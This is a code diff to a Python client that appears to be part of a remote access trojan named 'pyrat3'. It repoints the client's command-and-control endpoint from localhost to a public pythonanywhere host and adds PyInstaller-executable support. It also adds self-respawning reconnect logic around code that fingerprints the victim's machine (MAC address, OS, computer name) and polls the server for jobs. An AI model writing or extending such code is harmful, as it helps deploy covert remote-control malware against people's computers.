@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 
 import os
+import sys
 import shutil
 import socket
 import platform
@@ -12,7 +13,8 @@ from ast import literal_eval
 from tkinter import messagebox
 from time import gmtime, strftime, sleep
 
-HOME = "http://127.0.0.1:8000/pyrat3_server/api/"
+
+HOME = "https://pyrat.pythonanywhere.com/pyrat3_server/api/"
 
 
 def curr_datetime():
@@ -30,7 +32,7 @@ class Client:
         # Code for gain MAC-adress found on Stackoverflow
         # https://stackoverflow.com/questions/159137/getting-mac-address
         self.det_mac = "".join(
-            ("%012X" % getnode())[i : i + 2] for i in range(0, 12, 2)
+            ("%012X" % getnode())[i: i + 2] for i in range(0, 12, 2)
         )
         self.det_os = platform.system() + platform.release()
         self.det_name = os.environ["COMPUTERNAME"]
@@ -335,14 +337,20 @@ def main():
     Main function for managing jobs.
     :return: None
 
-    First, create object and get script path (for further re-runs of script).
-    Next, try to connect to server and after success, create necessary lists
-    for job_id management.
+    First, get script path (for further re-runs of script).
+    NOTE: try/except condition is necessary when client is packed to
+    executable file via pyInstaller. See:
+    https://pyinstaller.readthedocs.io/en/v3.3.1/runtime-information.html
+    Next, try to connect to server and after success, create client
+    object and necessary lists for job_id management.
     Go to loop and check that there is something to do.
     """
 
-    client = Client()
-    script_path = os.path.abspath(__file__)
+    try:
+        getattr(sys, 'frozen', False)
+        rerun_client = [sys.argv[0]]
+    except AttributeError:
+        rerun_client = ["python", os.path.abspath(__file__)]
 
     def connect_or_kill(try_count):
 
@@ -382,20 +390,28 @@ def main():
         while try_count:
             try:
                 print(f"++++ {attempt} {max_count - try_count + 1} OF {max_count} ++++")
+
+                """
+                Client-object declaration can produce exception (due to no connection) 
+                because it try to gather informations about det_ext_ip and country.
+                If there is a success, object client will be returned.
+                """
+
+                client = Client()
                 client.register_at_db()
-                break
+                return client
             except Exception as e:
                 print(e)
                 try_count -= 1
                 if not try_count:
-                    subprocess.Popen(["python", script_path])
+                    subprocess.Popen(rerun_client)
                     print(f"++++ {kill} ++++")
                     raise SystemExit
                 else:
                     print(f"++++ {fail} ++++")
                     sleep(5)
 
-    connect_or_kill(4)
+    client = connect_or_kill(4)
     received_job_id = []
     sent_job_id = []
 
@@ -409,7 +425,7 @@ def main():
         try:
             get_job = client.get_data()
         except Exception:
-            subprocess.Popen(["python", script_path])
+            subprocess.Popen(rerun_client)
             print(
                 f"++++ NEW ITERATION: UNABLE TO CONNECT, KILLING CURRENT INSTANCE ++++"
             )
